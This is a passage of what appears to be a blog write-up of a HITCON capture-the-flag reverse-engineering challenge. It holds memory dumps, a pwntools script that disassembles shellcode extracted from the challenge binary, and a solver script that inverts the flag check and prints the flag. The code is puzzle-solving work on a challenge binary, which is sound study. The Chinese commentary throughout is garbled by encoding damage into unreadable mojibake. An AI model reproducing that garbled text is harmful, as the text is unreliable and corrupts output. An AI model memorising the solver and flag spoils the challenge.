0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_array = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_array.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_array</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parsing plain and encrypted strings</span></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a decryption map from encrypted bytes to plain bytes</span></span><br><span class="line">decryption_map = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption Map: &quot;</span>, decryption_map)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 3: Parsing the shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disassemble the shellcode bytes for the amd64 architecture</span></span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the disassembled code for review</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Disassembled_code: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># Adds a blank line for better readability</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the shellcode bytes back into a string format for display or other uses</span></span><br><span class="line">shellcode_exe = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> shellcode_bytes])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the shellcode string in a format that&#x27;s ready to be used or analyzed</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode: &quot;</span>, shellcode_exe)</span><br></pre></td></tr></table></figure></div><h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">index_map = [<span class="number">61</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">14</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">43</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">59</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">60</span>, <span class="number">9</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">decrypt_map = &#123;<span class="number">251</span>: <span class="number">0</span>, <span class="number">123</span>: <span class="number">1</span>, <span class="number">78</span>: <span class="number">2</span>, <span class="number">187</span>: <span class="number">3</span>, <span class="number">81</span>: <span class="number">4</span>, <span class="number">21</span>: <span class="number">5</span>, <span class="number">141</span>: <span class="number">6</span>, <span class="number">219</span>: <span class="number">7</span>, <span class="number">176</span>: <span class="number">8</span>, <span class="number">172</span>: <span class="number">9</span>, <span class="number">165</span>: <span class="number">10</span>, <span class="number">142</span>: <span class="number">11</span>, <span class="number">170</span>: <span class="number">12</span>, <span class="number">178</span>: <span class="number">13</span>, <span class="number">96</span>: <span class="number">14</span>, <span class="number">235</span>: <span class="number">15</span>, <span class="number">99</span>: <span class="number">16</span>, <span class="number">92</span>: <span class="number">17</span>, <span class="number">222</span>: <span class="number">18</span>, <span class="number">66</span>: <span class="number">19</span>, <span class="number">43</span>: <span class="number">20</span>, <span class="number">198</span>: <span class="number">21</span>, <span class="number">166</span>: <span class="number">22</span>, <span class="number">53</span>: <span class="number">23</span>, <span class="number">48</span>: <span class="number">24</span>, <span class="number">67</span>: <span class="number">25</span>, <span class="number">214</span>: <span class="number">26</span>, <span class="number">95</span>: <span class="number">27</span>, <span class="number">189</span>: <span class="number">28</span>, <span class="number">36</span>: <span class="number">29</span>, <span class="number">177</span>: <span class="number">30</span>, <span class="number">227</span>: <span class="number">31</span>, <span class="number">140</span>: <span class="number">32</span>, <span class="number">167</span>: <span class="number">33</span>, <span class="number">213</span>: <span class="number">34</span>, <span class="number">42</span>: <span class="number">35</span>, <span class="number">124</span>: <span class="number">36</span>, <span class="number">109</span>: <span class="number">37</span>, <span class="number">139</span>: <span class="number">38</span>, <span class="number">23</span>: <span class="number">39</span>, <span class="number">157</span>: <span class="number">40</span>, <span class="number">131</span>: <span class="number">41</span>, <span class="number">254</span>: <span class="number">42</span>, <span class="number">105</span>: <span class="number">43</span>, <span class="number">16</span>: <span class="number">44</span>, <span class="number">89</span>: <span class="number">45</span>, <span class="number">169</span>: <span class="number">46</span>, <span class="number">158</span>: <span class="number">47</span>, <span class="number">15</span>: <span class="number">48</span>, <span class="number">28</span>: <span class="number">49</span>, <span class="number">102</span>: <span class="number">50</span>, <span class="number">151</span>: <span class="number">51</span>, <span class="number">91</span>: <span class="number">52</span>, <span class="number">97</span>: <span class="number">53</span>, <span class="number">237</span>: <span class="number">54</span>, <span class="number">173</span>: <span class="number">55</span>, <span class="number">224</span>: <span class="number">56</span>, <span class="number">218</span>: <span class="number">57</span>, <span class="number">39</span>: <span class="number">58</span>, <span class="number">6</span>: <span class="number">59</span>, <span class="number">37</span>: <span class="number">60</span>, <span class="number">220</span>: <span class="number">61</span>, <span class="number">94</span>: <span class="number">62</span>, <span class="number">231</span>: <span class="number">63</span>, <span class="number">65</span>: <span class="number">64</span>, <span class="number">50</span>: <span class="number">65</span>, <span class="number">210</span>: <span class="number">66</span>, <span class="number">217</span>: <span class="number">67</span>, <span class="number">143</span>: <span class="number">68</span>, <span class="number">238</span>: <span class="number">69</span>, <span class="number">175</span>: <span class="number">70</span>, <span class="number">3</span>: <span class="number">71</span>, <span class="number">147</span>: <span class="number">72</span>, <span class="number">58</span>: <span class="number">73</span>, <span class="number">0</span>: <span class="number">74</span>, <span class="number">162</span>: <span class="number">75</span>, <span class="number">225</span>: <span class="number">76</span>, <span class="number">179</span>: <span class="number">77</span>, <span class="number">236</span>: <span class="number">78</span>, <span class="number">129</span>: <span class="number">79</span>, <span class="number">159</span>: <span class="number">80</span>, <span class="number">202</span>: <span class="number">81</span>, <span class="number">88</span>: <span class="number">82</span>, <span class="number">183</span>: <span class="number">83</span>, <span class="number">121</span>: <span class="number">84</span>, <span class="number">253</span>: <span class="number">85</span>, <span class="number">59</span>: <span class="number">86</span>, <span class="number">160</span>: <span class="number">87</span>, <span class="number">2</span>: <span class="number">88</span>, <span class="number">12</span>: <span class="number">89</span>, <span class="number">203</span>: <span class="number">90</span>, <span class="number">168</span>: <span class="number">91</span>, <span class="number">128</span>: <span class="number">92</span>, <span class="number">192</span>: <span class="number">93</span>, <span class="number">22</span>: <span class="number">94</span>, <span class="number">77</span>: <span class="number">95</span>, <span class="number">47</span>: <span class="number">96</span>, <span class="number">117</span>: <span class="number">97</span>, <span class="number">113</span>: <span class="number">98</span>, <span class="number">10</span>: <span class="number">99</span>, <span class="number">4</span>: <span class="number">100</span>, <span class="number">57</span>: <span class="number">101</span>, <span class="number">255</span>: <span class="number">102</span>, <span class="number">193</span>: <span class="number">103</span>, <span class="number">156</span>: <span class="number">104</span>, <span class="number">171</span>: <span class="number">105</span>, <span class="number">239</span>: <span class="number">106</span>, <span class="number">164</span>: <span class="number">107</span>, <span class="number">216</span>: <span class="number">108</span>, <span class="number">226</span>: <span class="number">109</span>, <span class="number">20</span>: <span class="number">110</span>, <span class="number">194</span>: <span class="number">111</span>, <span class="number">108</span>: <span class="number">112</span>, <span class="number">100</span>: <span class="number">113</span>, <span class="number">30</span>: <span class="number">114</span>, <span class="number">107</span>: <span class="number">115</span>, <span class="number">126</span>: <span class="number">116</span>, <span class="number">153</span>: <span class="number">117</span>, <span class="number">46</span>: <span class="number">118</span>, <span class="number">9</span>: <span class="number">119</span>, <span class="number">11</span>: <span class="number">120</span>, <span class="number">134</span>: <span class="number">121</span>, <span class="number">116</span>: <span class="number">122</span>, <span class="number">106</span>: <span class="number">123</span>, <span class="number">196</span>: <span class="number">124</span>, <span class="number">45</span>: <span class="number">125</span>, <span class="number">79</span>: <span class="number">126</span>, <span class="number">249</span>: <span class="number">127</span>, <span class="number">250</span>: <span class="number">128</span>, <span class="number">148</span>: <span class="number">129</span>, <span class="number">182</span>: <span class="number">130</span>, <span class="number">31</span>: <span class="number">131</span>, <span class="number">137</span>: <span class="number">132</span>, <span class="number">111</span>: <span class="number">133</span>, <span class="number">93</span>: <span class="number">134</span>, <span class="number">232</span>: <span class="number">135</span>, <span class="number">234</span>: <span class="number">136</span>, <span class="number">181</span>: <span class="number">137</span>, <span class="number">90</span>: <span class="number">138</span>, <span class="number">101</span>: <span class="number">139</span>, <span class="number">136</span>: <span class="number">140</span>, <span class="number">197</span>: <span class="number">141</span>, <span class="number">127</span>: <span class="number">142</span>, <span class="number">119</span>: <span class="number">143</span>, <span class="number">17</span>: <span class="number">144</span>, <span class="number">207</span>: <span class="number">145</span>, <span class="number">241</span>: <span class="number">146</span>, <span class="number">27</span>: <span class="number">147</span>, <span class="number">63</span>: <span class="number">148</span>, <span class="number">244</span>: <span class="number">149</span>, <span class="number">72</span>: <span class="number">150</span>, <span class="number">71</span>: <span class="number">151</span>, <span class="number">18</span>: <span class="number">152</span>, <span class="number">228</span>: <span class="number">153</span>, <span class="number">186</span>: <span class="number">154</span>, <span class="number">223</span>: <span class="number">155</span>, <span class="number">233</span>: <span class="number">156</span>, <span class="number">98</span>: <span class="number">157</span>, <span class="number">110</span>: <span class="number">158</span>, <span class="number">180</span>: <span class="number">159</span>, <span class="number">150</span>: <span class="number">160</span>, <span class="number">205</span>: <span class="number">161</span>, <span class="number">19</span>: <span class="number">162</span>, <span class="number">83</span>: <span class="number">163</span>, <span class="number">75</span>: <span class="number">164</span>, <span class="number">40</span>: <span class="number">165</span>, <span class="number">215</span>: <span class="number">166</span>, <span class="number">209</span>: <span class="number">167</span>, <span class="number">51</span>: <span class="number">168</span>, <span class="number">184</span>: <span class="number">169</span>, <span class="number">230</span>: <span class="number">170</span>, <span class="number">122</span>: <span class="number">171</span>, <span class="number">44</span>: <span class="number">172</span>, <span class="number">155</span>: <span class="number">173</span>, <span class="number">41</span>: <span class="number">174</span>, <span class="number">68</span>: <span class="number">175</span>, <span class="number">82</span>: <span class="number">176</span>, <span class="number">247</span>: <span class="number">177</span>, <span class="number">32</span>: <span class="number">178</span>, <span class="number">242</span>: <span class="number">179</span>, <span class="number">49</span>: <span class="number">180</span>, <span class="number">211</span>: <span class="number">181</span>, <span class="number">185</span>: <span class="number">182</span>, <span class="number">64</span>: <span class="number">183</span>, <span class="number">208</span>: <span class="number">184</span>, <span class="number">52</span>: <span class="number">185</span>, <span class="number">245</span>: <span class="number">186</span>, <span class="number">84</span>: <span class="number">187</span>, <span class="number">26</span>: <span class="number">188</span>, <span class="number">1</span>: <span class="number">189</span>, <span class="number">161</span>: <span class="number">190</span>, <span class="number">146</span>: <span class="number">191</span>, <span class="number">252</span>: <span class="number">192</span>, <span class="number">133</span>: <span class="number">193</span>, <span class="number">7</span>: <span class="number">194</span>, <span class="number">190</span>: <span class="number">195</span>, <span class="number">221</span>: <span class="number">196</span>, <span class="number">188</span>: <span class="number">197</span>, <span class="number">25</span>: <span class="number">198</span>, <span class="number">243</span>: <span class="number">199</span>, <span class="number">54</span>: <span class="number">200</span>, <span class="number">246</span>: <span class="number">201</span>, <span class="number">114</span>: <span class="number">202</span>, <span class="number">152</span>: <span class="number">203</span>, <span class="number">76</span>: <span class="number">204</span>, <span class="number">125</span>: <span class="number">205</span>, <span class="number">199</span>: <span class="number">206</span>, <span class="number">212</span>: <span class="number">207</span>, <span class="number">69</span>: <span class="number">208</span>, <span class="number">74</span>: <span class="number">209</span>, <span class="number">154</span>: <span class="number">210</span>, <span class="number">195</span>: <span class="number">211</span>, <span class="number">138</span>: <span class="number">212</span>, <span class="number">229</span>: <span class="number">213</span>, <span class="number">80</span>: <span class="number">214</span>, <span class="number">70</span>: <span class="number">215</span>, <span class="number">204</span>: <span class="number">216</span>, <span class="number">104</span>: <span class="number">217</span>, <span class="number">118</span>: <span class="number">218</span>, <span class="number">103</span>: <span class="number">219</span>, <span class="number">201</span>: <span class="number">220</span>, <span class="number">14</span>: <span class="number">221</span>, <span class="number">60</span>: <span class="number">222</span>, <span class="number">87</span>: <span class="number">223</span>, <span class="number">240</span>: <span class="number">224</span>, <span class="number">34</span>: <span class="number">225</span>, <span class="number">191</span>: <span class="number">226</span>, <span class="number">38</span>: <span class="number">227</span>, <span class="number">132</span>: <span class="number">228</span>, <span class="number">13</span>: <span class="number">229</span>, <span class="number">144</span>: <span class="number">230</span>, <span class="number">163</span>: <span class="number">231</span>, <span class="number">174</span>: <span class="number">232</span>, <span class="number">61</span>: <span class="number">233</span>, <span class="number">29</span>: <span class="number">234</span>, <span class="number">200</span>: <span class="number">235</span>, <span class="number">145</span>: <span class="number">236</span>, <span class="number">5</span>: <span class="number">237</span>, <span class="number">135</span>: <span class="number">238</span>, <span class="number">112</span>: <span class="number">239</span>, <span class="number">8</span>: <span class="number">240</span>, <span class="number">115</span>: <span class="number">241</span>, <span class="number">33</span>: <span class="number">242</span>, <span class="number">73</span>: <span class="number">243</span>, <span class="number">85</span>: <span class="number">244</span>, <span class="number">62</span>: <span class="number">245</span>, <span class="number">55</span>: <span class="number">246</span>, <span class="number">35</span>: <span class="number">247</span>, <span class="number">24</span>: <span class="number">248</span>, <span class="number">86</span>: <span class="number">249</span>, <span class="number">206</span>: <span class="number">250</span>, <span class="number">130</span>: <span class="number">251</span>, <span class="number">56</span>: <span class="number">252</span>, <span class="number">149</span>: <span class="number">253</span>, <span class="number">120</span>: <span class="number">254</span>, <span class="number">248</span>: <span class="number">255</span>&#125;</span><br><span class="line"></span><br><span class="line">const_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_cal</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> const_data:</span><br><span class="line">    flag_list.extend(reverse_cal(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag_list = [decrypt_map[i] <span class="keyword">for</span> i <span class="keyword">in</span> flag_list]</span><br><span class="line">    flag_list = [flag_list[index_map[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag_list)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><ul><li>flag:<br><code>hitcon&#123;&lt;https://soundcloud.com/monstercat/noisestorm-crab-rave&gt;&#125;</code><br>flag æ˜¯ä¸€ä¸²ç¶²å€ï¼Œæ„Ÿè¦ºæœ‰é»åƒæ˜¯è¿·å›  XDï¼Œæœ‰èˆˆè¶£å¯ä»¥å»è½çœ‹çœ‹ï½</li></ul><h2 id="0x5-Summary"><a href="#0x5-Summary" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h2><p>è§£é€™é¡Œå’Œå¯« writeup å…¶å¯¦èŠ±äº†ä¸å°‘æ™‚é–“ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¿ƒå¾—å’Œå­¸åˆ°çš„æ•™è¨“ï¼š </p><ul><li><p>æ‰¾æŒ‡ä»¤çš„ä¸åŒæ€è·¯ï¼š<br>é€™é¡Œåœ¨åˆ†æçš„æ€è·¯ä¸Šç®—æ˜¯è »ç·šæ€§çš„ï¼ŒåŸºæœ¬ä¸Šè¦åˆ†æçš„ä¹Ÿåªæœ‰ <code>verify()</code> è·Ÿä¸€é»é» <code>prompt()</code>ï¼Œä¸éçœ‹åˆ°æœ‰å…¶ä»–é«˜æ‰‹ç”¨ <code>strings</code> ç›´æ¥æ‰¾åˆ° flag-checker çš„æŒ‡ä»¤å¾ˆä¸å¯æ€è­°ï¼Œä¸‹æ¬¡ä¹Ÿæœƒå¾é€™é‚Šåˆ‡å…¥å˜—è©¦ï¼Œä¹Ÿè¨±èƒ½çœä¸‹ä¸å°‘æ™‚é–“ã€‚</p></li><li><p>å‹åˆ¥è½‰æ›ï¼š<br>åœ¨å»ºæ˜ å°„è¡¨é‚„æœ‰å¯« exploit çš„æ™‚å€™ï¼Œå‹åˆ¥è½‰æ›éƒ½è »å›°æ“¾æˆ‘çš„ï¼Œå¾€å¾€æ˜¯åŸ·è¡Œå¾Œæ‰ç™¼ç¾æœ‰å•é¡Œï¼Œä¹Ÿåƒäº†ä¸€é»æ™‚é–“åœ¨ debugï¼Œä¸éé€™å°±æ˜¯ç¶“é©—ä¸è¶³ï¼Œè¬›å‡ºä¾†å°±æ˜¯è¦å†æ‰è‡ªå·±ä¸€æ¬¡ï¼Œç†Ÿæ‚‰å¾Œå¯« script çš„æ•ˆç‡æƒ³å¿…ä¹Ÿæœƒæå‡ä¸å°‘ï¼Œå°±æ›´æœ‰æ©Ÿæœƒåœ¨æ™‚é–“å…§è§£å‡ºé€™ç¨®éº»ç…©çš„é¡Œç›®äº†ã€‚</p></li><li><p>æ•—ç­†ï¼š<br><code>verify()</code> å‰é¢è™•ç† input çš„éƒ¨åˆ†å¾éœæ…‹åˆ†æéƒ½èƒ½å¤ å¤§æ¦‚çœ‹å‡ºä¾†ï¼Œä½†å¾Œé¢å¯«å…¥ 255 bytes çš„ shellcode 